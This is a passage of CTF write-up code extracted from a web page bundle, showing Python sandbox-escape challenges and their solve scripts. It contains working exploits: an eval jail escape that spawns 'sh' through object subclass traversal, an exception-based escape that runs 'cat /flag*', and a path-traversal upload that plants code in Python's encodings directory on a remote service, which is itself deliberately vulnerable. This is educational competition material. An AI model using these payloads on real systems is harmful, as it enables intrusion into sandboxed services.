ss <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
obj <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mro<span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
cus <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"\\137\\137exit\\137\\137"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>e<span class="token punctuation">,</span>v<span class="token punctuation">,</span>t<span class="token punctuation">:</span> <span class="token punctuation">[</span>ss<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"\\137\\137enter\\137\\137"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
f <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token boolean">None</span>
<span class="token keyword">with</span> cus<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    obj<span class="token punctuation">.</span>lol
<span class="token keyword">print</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span>
ex <span class="token operator">=</span> ss<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token string">"&#123;0.\\137\\137globals\\137\\137[\\137\\137builtins\\137\\137][\\137\\137import\\137\\137].lol&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
<span class="token keyword">except</span> ex <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token string">"&#123;0.popen.lol&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>obj<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> ex <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>obj<span class="token punctuation">(</span><span class="token string">"cat /flag*"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#EOF</span></code>`,Jo,Fn,Ia,su,Qo,Dn,$t,Xt,au,ne,In,Kd=`<code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You get one chance to awaken from the ice prison."</span><span class="token punctuation">)</span>
code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"input: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
whitelist <span class="token operator">=</span> <span class="token triple-quoted-string string">"""gctf&#123;"*+*(=>:/)*+*"&#125;"""</span> <span class="token comment"># not the flag</span>
<span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x <span class="token keyword">not</span> <span class="token keyword">in</span> whitelist <span class="token keyword">for</span> x <span class="token keyword">in</span> code<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">40000</span><span class="token punctuation">:</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Denied!"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code>`,se,Hn,Kt,Zt,tu,ae,On,Zd=`<code class="language-py">m <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""[a for a in ().__class__.__base__.__subclasses__() if 'wrapper' not in f'&#123;a.__init__&#125;'][0].__init__.__builtins__['__import__']('os').system('sh')"""</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> m<span class="token punctuation">]</span>
m <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>

mapping <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"g"</span><span class="token punctuation">,</span>
    <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"t"</span><span class="token punctuation">,</span>
    <span class="token number">32</span><span class="token punctuation">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span>
    <span class="token number">91</span><span class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t*t*t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t*t*t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t*t*t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+g+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'l'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'e'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'u'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'t'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+g"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"f+t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t*t*t*t+t+t+t+t+t+t+t"</span><span class="token punctuation">,</span>
    <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token string">"c+t+t+t+t+t+t+g"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

payload <span class="token operator">=</span> <span class="token string">'f"&#123;(f:=(t:=(g:=+(()==()))+g)*t*t*t*t+g+g)+t*t*(t+g):c&#125;&#123;(c:=(f*t+t*t*t*t+t*t*t+t+g)):c&#125;&#123;c:c&#125;&#123;c+t+t:c&#125;'</span>
payload <span class="token operator">=</span> <span class="token string">'f"&#123;(c:=(f:=(t:=(g:=+(()==()))+g)*t*t*t*t)*t+t*t*t*t+t*t*t+t+g):c&#125;&#123;c+t+t+t:c&#125;&#123;f:c&#125;'</span>

whitelist <span class="token operator">=</span> <span class="token triple-quoted-string string">"""gctf&#123;"*+*(=>:/)*+*"&#125;"""</span>
<span class="token comment"># generate payload</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> m<span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">in</span> whitelist<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#123;"</span> <span class="token keyword">or</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> mapping<span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> <span class="token string">"&#123;c:c&#125;"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> <span class="token string">"&#123;%s:c&#125;"</span> <span class="token operator">%</span> mapping<span class="token punctuation">[</span>c<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token string">'"'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># verify payload is the same</span></code>`,te,Rn,Ha,pu,pe,jn,Jt,Qt,ou,oe,Un,Jd=`<code class="language-py"><span class="token keyword">import</span> sys
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This is a safe calculator"</span><span class="token punctuation">)</span>
inp <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Formula: "</span><span class="token punctuation">)</span>
sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

blacklist <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."</span>
<span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>x <span class="token keyword">in</span> inp <span class="token keyword">for</span> x <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Nice try"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

fns <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">"setattr"</span><span class="token punctuation">:</span> <span class="token builtin">setattr</span><span class="token punctuation">,</span> <span class="token string">"__import__"</span><span class="token punctuation">:</span> <span class="token builtin">__import__</span><span class="token punctuation">,</span> <span class="token string">"chr"</span><span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> fns<span class="token punctuation">,</span> fns<span class="token punctuation">)</span><span class="token punctuation">)</span></code>`,ee,Pn,np,sp,eu,ce,Bn,Qd='<code class="language-py"><span class="token comment"># TBA</span></code>',le,Mn,Oa,cu,ue,qn,ap,tp,lu,ie,Nn,nf=`<code class="language-py"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> send_from_directory
<span class="token keyword">import</span> dis
<span class="token keyword">import</span> io
<span class="token keyword">import</span> contextlib
<span class="token keyword">import</span> os
<span class="token keyword">import</span> datetime
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/report/&lt;path:filename>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">serve_reports</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> send_from_directory<span class="token punctuation">(</span><span class="token string">'./reports/'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">del</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span>
    res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>
    <span class="token keyword">return</span> res

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/disassemble'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">disassemble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    report_name <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>filename
    source <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'./reports/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/report/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">)</span>
    report <span class="token operator">=</span> io<span class="token punctuation">.</span>StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> contextlib<span class="token punctuation">.</span>redirect_stdout<span class="token punctuation">(</span>report<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Report for'</span><span class="token punctuation">,</span> report_name<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Report date:'</span><span class="token punctuation">,</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            code <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token string">'&lt;string>'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">)</span>
            dis<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
        <span class="token keyword">except</span> SyntaxError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Source code:'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./reports/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        width <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> report<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> report<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            line <span class="token operator">=</span> line<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>width<span class="token punctuation">)</span> <span class="token keyword">if</span> line <span class="token operator">!=</span> <span class="token string">'-'</span> <span class="token keyword">else</span> <span class="token string">'-'</span> <span class="token operator">*</span> width
            <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'# '</span> <span class="token operator">+</span> line <span class="token operator">+</span> <span class="token string">' #&#92;n'</span><span class="token punctuation">)</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>source<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/report/'</span> <span class="token operator">+</span> report_name<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span></code>`,ke,Sn,pp,op,uu,re,zn,sf=`<code class="language-py"><span class="token comment"># @null</span>
<span class="token keyword">import</span> requests
<span class="token comment"># target = 'http://localhost:1337/'</span>
target <span class="token operator">=</span> <span class="token string">'http://io.ept.gg:42256/'</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">b'''import os
os.system('cp /flag*.txt /app/reports/flag.txt')'''</span>

<span class="token comment"># Upload payload to /usr/local/lib/python3.12/encodings/fefe.py</span>
files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'source'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'../../usr/local/lib/python3.12/encodings/fefe.py'</span><span class="token punctuation">,</span> payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/api/disassemble'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token comment"># When running or compiling python files that use the fefe encoding will now trigger our payload</span>
files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'source'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'fefe.py'</span><span class="token punctuation">,</span> <span class="token string">b'# encoding: fefe'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/api/disassemble'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment"># trigger payload</span>
<span class="token comment"># Read flag</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/report/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></code>`,_e,Yn,Ra,iu,de,Wn,ep,cp,ku,fe,Vn,af=`<code class="language-py"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#</span>
    x <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"palindrome? "</span><span class="token punctuation">)</span><span class="token comment">#</span>
    <span class="token keyword">assert</span> <span class="token string">"#"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> x<span class="token punctuation">,</span> <span class="token string">"comments are bad"</span><span class="token comment">#</span>
    <span class="token keyword">assert</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ascii only kthx"</span><span class="token comment">#</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> x <span class="token operator">==</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"not a palindrome"</span><span class="token comment">#</span>
    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token string">"palindromes can't be more than 35 characters long, this is a well known fact."</span><span class="token comment">#</span>
    <span class="token comment">#assert sum(x.encode()) % 256 == 69, "not nice!"#</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment">#)x(lave</span>
<span class="token comment">#"!ecin ton" ,96 == 652 % ))(edocne.x(mus tressa</span>
<span class="token comment">#".tcaf nwonk llew a si siht ,gnol sretcarahc 53 naht erom eb t'nac semordnilap" ,63 &lt; )x(nel tressa</span>
<span class="token comment">#"emordnilap a ton" ,]1-::[x == x tressa</span>
<span class="token comment">#"xhtk ylno iicsa" ,)x ni i rof 821 &lt; )i(dro(lla tressa</span>
<span class="token comment">#"dab era stnemmoc" ,x ni ton "#" tressa</span>
<span class="token comment">#)" ?emordnilap"(tupni = x</span>
<span class="token comment">#:eurT elihw</span></code>`,be,Gn,lp,up,ru,ye,$n,tf=`<code class="language-py"><span class="token comment"># setting up template for generating palindromes</span>
alph <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstvwyzABCDEFGHIJKLMNOPQRSTVWYZ1234567890!\\"</span><span class="token comment">#\xA4%&amp;/()=?@$\u20AC&#123;[]&#125;"</span>
dd <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""'START\\',)"CHAR"=:VAR1(,',(VAR1:="CHAR"),'\\START'"""</span>
ff <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""'START\\',)"CHAR"+VAR2=:VAR1(,',(VAR1:=VAR2+"CHAR"),'\\START'"""</span>
gg <span class="token operator">=</span> <span class="token triple-quoted-string string">r"""'START\\',))VAR1(lave(,',(eval(VAR1)),'\\START'"""</span>
ch <span class="token operator">=</span> <span class="token punctuation">[</span>dd<span class="token punctuation">,</span>ff<span class="token punctuation">,</span>gg<span class="token punctuation">]</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""eval(input());"""</span>
out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

var <span class="token operator">=</span> var2 <span class="token operator">=</span> <span class="token string">"C"</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span>char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
